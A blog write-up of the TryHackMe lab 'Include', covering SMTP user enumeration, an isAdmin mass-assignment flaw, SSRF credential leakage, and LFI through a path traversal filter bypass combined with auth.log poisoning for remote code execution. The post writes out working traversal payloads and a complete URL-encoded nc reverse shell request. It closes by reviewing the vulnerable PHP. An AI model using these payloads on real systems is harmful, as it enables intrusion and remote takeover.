---
layout: post
title: "TryHackMe: Include"
date: 2024-06-07 0700 -0500
categories: [writeups, tryhackme]
tags:
  - LFI
  - log_poisoning
  - SSRF
image: /images/tryhackme_include/include.png
---
## Summary

Include is a **MEDIUM** difficulty room on [TryHackMe](https://tryhackme.com/r/room/include) that involves abusing a logic flaw to get access to an admin panel, leveraging an internal API to obtain credentials for another service via a Server-Side Request Forgery (SSRF), and then combining a Local File Inclusion (LFI) vulnerability with log poisoning to achieve Remote Code Execution (RCE) on the web server. It should be noted that a subscription to TryHackMe is required to play this room. 

## Walkthrough

### Enumeration

#### Port Scanning

The initial Nmap scan shows 8 ports open, as follows:

```console
22/open/tcp/ssh/OpenSSH8.2p1Ubuntu4ubuntu0.11(UbuntuLinux;protocol2.0)
25/open/tcp/smtp/Postfixsmtpd
110/open/tcp/pop3/Dovecotpop3d
143/open/tcp/imap/Dovecotimapd(Ubuntu)
993/open/tcp/ssl|imap/Dovecotimapd(Ubuntu)
995/open/tcp/ssl|pop3/Dovecotpop3d
4000/open/tcp/http/Node.js(Expressmiddleware)
50000/open/tcp/http/Apachehttpd2.4.41((Ubuntu))
```

#### Service Enumeration

##### SSH

This isn't an ancient version of SSH, so it's unlikely that we'll find an exploitable condition in SSH itself, but it's worth checking to see if the service accepts password authentication and/or if a weak password might be in use. 

Password authentication is supported, however the initial check for weak passwords failed. 

```console
$ ssh root@$ip

The authenticity of host '10.10.172.107 (10.10.172.107)' can't be established.
ED25519 key fingerprint is SHA256:uURSOQLABB+Das+Emk8jQtlj9stf8TDyVdiz6DZmjoU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.172.107' (ED25519) to the list of known hosts.
root@10.10.172.107's password:
Permission denied, please try again.
root@10.10.172.107's password:
Permission denied, please try again.
root@10.10.172.107's password:
root@10.10.172.107: Permission denied (publickey,password).
```

We can move on from SSH for now.

##### SMTP

Using `telnet` to connect to the SMTP service, we're able to enumerate valid users on the system, as shown below. Note the message after attempting to send mail to a user that does not exist ("doesnotexist") compared to the message received after entering a user that does exist ("root").

```console
$ telnet $ip 25

Trying 10.10.172.107...
Connected to 10.10.172.107.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
HELO x
250 mail.filepath.lab
MAIL FROM: attacker@example.com
250 2.1.0 Ok
RCPT TO: doesnotexist
550 5.1.1 <doesnotexist>: Recipient address rejected: User unknown in local recipient table
RCPT TO: root
250 2.1.5 Ok
```

We can use a tool like `smtp-user-enum` to try to gather a list of valid usernames. I ran this using the `john.txt` wordlist from [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames). As shown below, the we've found two usernames: `joshua` and `charles`.

![](images/tryhackme_include/Pasted%20image%2020240606074209.png)

Let's hold onto this for now and come back to it later. 

##### IMAP/POP3

We can grab the IMAP banner with netcat.

```console
$ nc -nv $ip 143

Connection to 10.10.102.86 143 port [tcp/*] succeeded!
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
```

Trying to log in, we get an error that plaintext authentication is not authorized over the unencrypted channel (good!). 

```console
A1 LOGIN th0m12 th0m12
* BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
A1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

Connecting with openssl allows entering credentials, but since we don't have creds there's not much we can access. If nothing pans out with the other services, we might circle back to this to try brute forcing the credentials using the two usernames we've already enumerated. 

```console
$ openssl s_client -connect $ip:993 -quiet

Can't use SSL_get_servername
depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
verify return:1
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN AUTH=LOGIN] Dovecot (Ubuntu) ready.
A1 LOGIN th0m12 password
A1 NO [AUTHENTICATIONFAILED] Authentication failed.
A1 LIST "" *
A1 BAD Error in IMAP command received by server.
A1 SELECT Inbox
A1 BAD Error in IMAP command received by server.
```

Similarly, I didn't get anything from the POP3 service running on the server either.

```console
$ openssl s_client -connect $ip:995 -crlf -quiet

Can't use SSL_get_servername
depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
verify return:1
+OK Dovecot (Ubuntu) ready.
user th0m12
+OK
pass Password1!
-ERR [AUTH] Authentication failed.
LIST
-ERR Unknown command.
RETR 1
-ERR Unknown command.
```

### Exploitation

#### Web
##### HTTP - Port 4000

After adding the IP to the `/etc/hosts` file with the command below we're able to browse to the first web app:

```console
$ echo -n '10.10.188.130\tinclude.thm' | sudo tee -a /etc/hosts
```

![](images/tryhackme_include/Pasted%20image%2020240606202332.png)

After logging in with `guest:guest` we're greeted with a "Review App". 

![](images/tryhackme_include/Pasted%20image%2020240606202537.png)

Looking at the "guest" profile, there are a number of different attributes, and it looks like we can recommend activities for the user.

![](images/tryhackme_include/Pasted%20image%2020240606202756.png)

Under the "Recommend an Activity to guest" heading, it's possible to add a new activity type and name. To start, I entered `test:test`. As shown below, this gets added as a new attribute. 

![](images/tryhackme_include/Pasted%20image%2020240606203123.png)

The attribute that sticks out the most is that `isAdmin: false`. It might be possible to overwrite the `isAdmin` value to give ourselves admin privileges.

After entering `isAdmin:true` in the recommend an activity section, we can see that our user is now an admin and we have access to some new menu options. 

![](images/tryhackme_include/Pasted%20image%2020240606203355.png)

Selecting the "API" option from the navigation bar brings up some API documentation listing endpoints on the localhost. 

![](images/tryhackme_include/Pasted%20image%2020240607074044.png)

On the settings page, there's an option to update the profile banner. 

![](images/tryhackme_include/Pasted%20image%2020240607074202.png)

This accepts a URL as input. It might be possible to use this to reach those API endpoints. 

![](images/tryhackme_include/Pasted%20image%2020240607074305.png)

When we enter that and hit "Update Banner Image", we get back the following response:

![](images/tryhackme_include/Pasted%20image%2020240607074354.png)


Looks like a base64-encoded string.

```console 
$ echo 'eyJSZXZpZXdBcHBVc2VybmFtZS[...SNIP...]N0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq

{
  "ReviewAppUsername": "admin",
  "ReviewAppPassword": "[REDACTED]",
  "SysMonAppUsername": "administrator",
  "SysMonAppPassword": "[REDACTED]"
}
```

##### HTTP - Port 50000

Sweet. We've got a password that will allow us to log into the other web app on port 50000. 

![](images/tryhackme_include/Pasted%20image%2020240607074657.png)

After using those credentials to log in, we land on a dashboard that contains the first flag.

![](images/tryhackme_include/Pasted%20image%2020240607074913.png)

Notice in the source code for `dashboard.php`, the profile picture is sourced from `profile.php` using an `img` parameter. 

![](images/tryhackme_include/Pasted%20image%2020240607075320.png)

In fact, we can see this request in Burp Suite.

![](images/tryhackme_include/Pasted%20image%2020240607075442.png)

My first thought with this is testing for path traversal. Since I'm on Burp community edition with a significantly throttled intruder, I'm going to use `ffuf` for testing this quickly. Zapproxy, Caido, or other fuzzing tools will also probably work.

To make this work with `ffuf` I saved the request to a file and then replaced "profile.png" with "FUZZ", as shown below:

![](images/tryhackme_include/Pasted%20image%2020240607080247.png)

Having configured the request file, we can run `ffuf` against it. 

```console
$ ffuf -r -c -request req.txt -request-proto 'http' -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://include.thm:50000/profile.php?img=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Cookie: PHPSESSID=gbvb62jo9gnq3vbbknsie463i7
 :: Header           : X-PwnFox-Color: orange
 :: Header           : Host: include.thm:50000
 :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
 :: Header           : Accept: image/avif,image/webp,*/*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://include.thm:50000/dashboard.php
 :: Header           : Priority: u=4
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 191ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 188ms]
[...SNIP...]
```

After fuzzing we find some path traversal sequences that work. Testing one of those in Burp, we find that it does in fact work to grab the `/etc/passwd` file. 

![](images/tryhackme_include/Pasted%20image%2020240607080714.png)

From here, we need to find a way to get RCE. Since we have an LFI vulnerability, as well as a couple services exposed on the server, my thought is log poisoning. 

After some poking around, I found at least two that will probably work: `/var/log/auth.log` and `/var/log/mail.log`. 

Looking at `auth.log`:

```console
HTTP/1.1 200 OK
Date: Fri, 07 Jun 2024 13:13:51 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 719
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


Jun  7 12:30:59 mail sshd[1853]: Server listening on 0.0.0.0 port 22.
Jun  7 12:30:59 mail sshd[1853]: Server listening on :: port 22.
Jun  7 12:34:35 mail auth: pam_unix(dovecot:auth): check pass; user unknown
Jun  7 12:34:35 mail auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=th0m12 rhost=10.2.113.252 
Jun  7 12:39:01 mail CRON[2009]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  7 12:39:01 mail CRON[2009]: pam_unix(cron:session): session closed for user root
Jun  7 13:09:01 mail CRON[2220]: pam_unix(cron:session): session opened for user root by (uid=0)
Jun  7 13:09:01 mail CRON[2220]: pam_unix(cron:session): session closed for user root
```

After attempting to SSH into the server, we can check the log again to see if the new entry is there. 

![](images/tryhackme_include/Pasted%20image%2020240607081809.png)

Perfect. Let's see if we can inject a PHP web shell here. 

![](images/tryhackme_include/Pasted%20image%2020240607081938.png)

Trying to use the standard SSH syntax doesn't work. However, it's possible to still poison the log using `NetExec` or `hydra`. Here, I used `NetExec`. 

![](images/tryhackme_include/Pasted%20image%2020240607082114.png)

After checking the log again along with the `id` command, we can see that we've got command execution. 

![](images/tryhackme_include/Pasted%20image%2020240607082700.png)

From here, you can either list the contents of the `/var/www/html/` directory from Burp repeater, or you can try to get a reverse shell and browse around a bit easier. The first time I did this room, I did it entirely in Burp, but for the purpose of this writeup, I'll test the reverse shell method.

Using the following URL-encoded command I was able to get a reverse shell. I used [revshells.com](https://revshells.com) to generate this.

```console
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff
```

```console
GET /profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/auth.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff HTTP/1.1
Host: include.thm:50000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://include.thm:50000/dashboard.php
Cookie: PHPSESSID=gbvb62jo9gnq3vbbknsie463i7
X-PwnFox-Color: orange
Priority: u=4


```

![](images/tryhackme_include/Pasted%20image%2020240607083339.png)

Here is the "mystery" text file that will give us flag 2.

![](images/tryhackme_include/Pasted%20image%2020240607083503.png)

## Additional Digging

Looking at the code for `profile.php`, we can see what's happening here.

```php
<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: login.php');
    exit();
}

if(!empty($_GET['img'])){
    $file = $_GET['img'];
    $file = str_replace('../', '', $file);

    $file = preg_replace('/\.\.\//', '', $file, 5);
    $filePath = 'uploads/' . $file;

    if (strpos($filePath, 'uploads/') === 0) {
        @include($filePath);
    }
} else {
    echo "No data received.";
}
?>
```

So the code is stripping out `../` sequences, but it's using the `preg_replace` function to strip out the first five occurrences of `../`. 

One potential option to prevent the path traversal might be to use the `realpath` PHP function which returns the canonicalized absolute path. I am not a PHP developer though, so if there are better solutions to prevent this, I'd love to hear about them. 

---
## Resources

[preg-replace](https://www.php.net/manual/en/function.preg-replace.php)  

[strpos](https://www.php.net/manual/en/function.strpos.php)

[realpath](https://www.php.net/manual/en/function.realpath.php)
